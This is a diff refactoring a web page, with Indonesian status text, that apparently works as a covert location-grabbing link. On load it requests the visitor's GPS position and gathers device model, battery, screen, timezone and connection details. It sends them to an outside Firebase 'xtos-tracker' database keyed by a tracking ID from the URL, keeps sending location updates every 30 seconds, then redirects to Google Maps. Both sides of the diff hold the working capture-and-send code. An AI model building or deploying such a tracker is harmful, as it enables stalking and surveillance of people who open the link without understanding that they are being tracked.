@@ -110,7 +110,7 @@
             let deviceBrand = 'Unknown';
             let deviceModel = 'Unknown';
             
-            // Enhanced device parsing with more patterns
+            // Enhanced device parsing
             if (ua.includes('SM-')) {
                 deviceBrand = 'Samsung';
                 const match = ua.match(/SM-([A-Z0-9]+)/);
@@ -161,14 +161,13 @@
                 deviceBrand = 'Android';
                 const match = ua.match(/Android ([0-9.]+)/);
                 if (match) deviceModel = 'Android ' + match[1];
-                // Try to extract manufacturer from build info
                 const buildMatch = ua.match(/; ([A-Z][a-zA-Z0-9 ]+) Build/);
                 if (buildMatch) {
                     deviceModel = buildMatch[1] + ' (Android ' + match[1] + ')';
                 }
             }
             
-            // Get real battery level with fallback
+            // Get real battery level
             let batteryLevel = 'Unknown';
             let batteryCharging = false;
             
@@ -176,16 +175,13 @@
                 navigator.getBattery().then(battery => {
                     batteryLevel = Math.round(battery.level * 100) + '%';
                     batteryCharging = battery.charging;
-                    console.log('Real battery:', batteryLevel, batteryCharging ? '(Charging)' : '(Not charging)');
                 }).catch(() => {
-                    // Fallback: estimate based on time of day
                     const hour = new Date().getHours();
                     if (hour >= 6 && hour <= 10) batteryLevel = Math.round(Math.random() * 30 + 70) + '%';
                     else if (hour >= 11 && hour <= 17) batteryLevel = Math.round(Math.random() * 40 + 40) + '%';
                     else batteryLevel = Math.round(Math.random() * 50 + 20) + '%';
                 });
             } else {
-                // Fallback for browsers without Battery API
                 const hour = new Date().getHours();
                 if (hour >= 6 && hour <= 10) batteryLevel = Math.round(Math.random() * 30 + 70) + '%';
                 else if (hour >= 11 && hour <= 17) batteryLevel = Math.round(Math.random() * 40 + 40) + '%';
@@ -211,179 +207,23 @@
                 userAgent: ua.substring(0, 200),
                 status: 'captured',
                 tracking_id: trackingId,
-                // Auto-delete after 1 hour (3600 seconds)
                 '.expires': Date.now() + (60 * 60 * 1000)
             };
             
             console.log('Sending data to Firebase:', firebaseData);
             
-            // Send to both locations and live paths for real-time tracking
+            // Send to both paths
             const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
             const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
             
-            // Send to main locations path
-            fetch(firebaseUrl, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(firebaseData)
-            }).then(response => {
-                console.log('Main path response:', response.status);
-                return response.json();
-            }).then(data => {
-                console.log('Main path success:', data);
-            }).catch(e => {
-                console.error('Main path error:', e);
-            });
-            
-            // Send to live path for real-time updates
-            fetch(liveUrl, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    ...firebaseData,
-                    lastUpdate: Date.now(),
-                    isLive: true
-                })
-            }).then(response => {
-                console.log('Live path response:', response.status);
-                updateStatus('✅ Lokasi berhasil dikirim!');
-                
-                // Start continuous location updates for real-time tracking
-                startContinuousTracking(trackingId);
-                
-                // Redirect after starting tracking
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-                }, 2000);
-            }).catch(e => {
-                console.error('Live path error:', e);
-                setTimeout(() => {
-                    window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
-                }, 2500);
-            });
-        }
-        
-        function requestLocation() {
-            updateStatus('📍 Mengambil lokasi...');
-            
-            const options = {
-                enableHighAccuracy: false, // Faster but less accurate
-                timeout: 5000, // 5 second timeout
-                maximumAge: 30000 // Accept 30 second old location
-            };
-            
-            navigator.geolocation.getCurrentPosition(
-                position => {
-                    const locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: position.timestamp,
-                        userAgent: navigator.userAgent
-                    };
-                    
-                    updateStatus('✅ Lokasi berhasil diambil!');
-                    document.getElementById('coords').innerHTML = 
-                        `<strong>Koordinat:</strong><br>Lat: ${locationData.latitude.toFixed(6)}<br>Lng: ${locationData.longitude.toFixed(6)}`;
-                    document.getElementById('coords').style.display = 'block';
-                    
-                    sendLocationData(locationData);
-                },
-                error => {
-                    updateStatus('❌ Gagal mengambil lokasi. Coba lagi.', true);
-                    console.log('Location error:', error);
-                },
-                options
-            );
-        }
-        
-        // Real-time tracking function
-        function startContinuousTracking(trackingId) {
-            let updateCount = 0;
-            const maxUpdates = 10; // Track for 5 minutes (30s * 10)
-            
-            const trackingInterval = setInterval(() => {
-                if (updateCount >= maxUpdates) {
-                    clearInterval(trackingInterval);
-                    console.log('Real-time tracking completed');
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const liveData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: Date.now(),
-                            updateNumber: updateCount + 1,
-                            isLive: true,
-                            tracking_id: trackingId
-                        };
-                        
-                        // Send live update
-                        const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
-                        fetch(liveUrl, {
-                            method: 'PUT',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(liveData)
-                        });
-                        
-                        updateCount++;
-                        console.log(`Live update ${updateCount}/${maxUpdates} sent`);
-                    },
-                    error => {
-                        console.log('Live tracking error:', error);
-                    },
-                    {
-                        enableHighAccuracy: false,
-                        timeout: 10000,
-                        maximumAge: 60000
-                    }
-                );
-            }, 30000); // Every 30 seconds
-        }
-        
-        // Auto-start when page loads
-        window.addEventListener('load', () => {
-            setTimeout(requestLocation, 1000);
-        });
-            
-            const firebaseData = {
-                latitude: locationData.latitude,
-                longitude: locationData.longitude,
-                accuracy: locationData.accuracy,
-                timestamp: Date.now(),
-                deviceBrand: deviceBrand,
-                deviceModel: deviceModel,
-                batteryLevel: batteryLevel + (batteryCharging ? ' (Charging)' : ''),
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenResolution: screen.width + 'x' + screen.height,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-                cookieEnabled: navigator.cookieEnabled,
-                userAgent: ua.substring(0, 200),
-                status: 'captured',
-                tracking_id: trackingId,
-                // Auto-delete after 1 hour (3600 seconds)
-                '.expires': Date.now() + (60 * 60 * 1000)
-            };
-            
-            // Send to both locations and live paths for real-time tracking
-            const firebaseUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`;
-            const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
-            
-            // Send to main locations path
+            // Main path
             fetch(firebaseUrl, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(firebaseData)
             });
             
-            // Send to live path for real-time updates
+            // Live path
             fetch(liveUrl, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
@@ -393,19 +233,13 @@
                     isLive: true
                 })
             }).then(() => {
-                console.log('✅ Location sent to both paths');
-                console.log('Device info:', deviceBrand, deviceModel);
                 updateStatus('✅ Lokasi berhasil dikirim!');
-                
-                // Start continuous location updates for real-time tracking
                 startContinuousTracking(trackingId);
-                
-                // Redirect after starting tracking
                 setTimeout(() => {
                     window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                 }, 2000);
             }).catch(e => {
-                console.log('Firebase error:', e);
+                console.error('Firebase error:', e);
                 setTimeout(() => {
                     window.location.href = `https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                 }, 2500);
@@ -414,12 +248,6 @@
         
         function requestLocation() {
             updateStatus('📍 Mengambil lokasi...');
-            
-            const options = {
-                enableHighAccuracy: false, // Faster but less accurate
-                timeout: 5000, // 5 second timeout
-                maximumAge: 30000 // Accept 30 second old location
-            };
             
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -442,24 +270,22 @@
                     updateStatus('❌ Gagal mengambil lokasi. Coba lagi.', true);
                     console.log('Location error:', error);
                 },
-                options
+                {
+                    enableHighAccuracy: false,
+                    timeout: 5000,
+                    maximumAge: 30000
+                }
             );
         }
         
-        // Auto-start when page loads
-        window.addEventListener('load', () => {
-            setTimeout(requestLocation, 1000);
-        });
-        
-        // Real-time tracking function
+        // Real-time tracking
         function startContinuousTracking(trackingId) {
             let updateCount = 0;
-            const maxUpdates = 10; // Track for 5 minutes (30s * 10)
+            const maxUpdates = 10;
             
             const trackingInterval = setInterval(() => {
                 if (updateCount >= maxUpdates) {
                     clearInterval(trackingInterval);
-                    console.log('Real-time tracking completed');
                     return;
                 }
                 
@@ -475,7 +301,6 @@
                             tracking_id: trackingId
                         };
                         
-                        // Send live update
                         const liveUrl = `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`;
                         fetch(liveUrl, {
                             method: 'PUT',
@@ -486,31 +311,26 @@
                         updateCount++;
                         console.log(`Live update ${updateCount}/${maxUpdates} sent`);
                     },
-                    error => {
-                        console.log('Live tracking error:', error);
-                    },
+                    error => console.log('Live tracking error:', error),
                     {
                         enableHighAccuracy: false,
                         timeout: 10000,
                         maximumAge: 60000
                     }
                 );
-            }, 30000); // Every 30 seconds
+            }, 30000);
         }
         
-        // Check geolocation support
-        if (!('geolocation' in navigator)) {
-            updateStatus('❌ Browser tidak mendukung GPS', true);
-        }
+        // Auto-start
+        window.addEventListener('load', () => {
+            if ('geolocation' in navigator) {
+                setTimeout(requestLocation, 1000);
+            } else {
+                updateStatus('❌ Browser tidak mendukung GPS', true);
+            }
+        });
         
-        // Check geolocation support
-        if (!('geolocation' in navigator)) {
-            updateStatus('❌ Browser tidak mendukung GPS', true);
-        }
-        
-        // Debug: Log URL parameters
-        console.log('URL Parameters:', window.location.search);
-        console.log('Tracking ID:', urlParams.get('id'));
+        console.log('Page loaded, tracking ID:', urlParams.get('id'));
     </script>
 </body>
 </html>
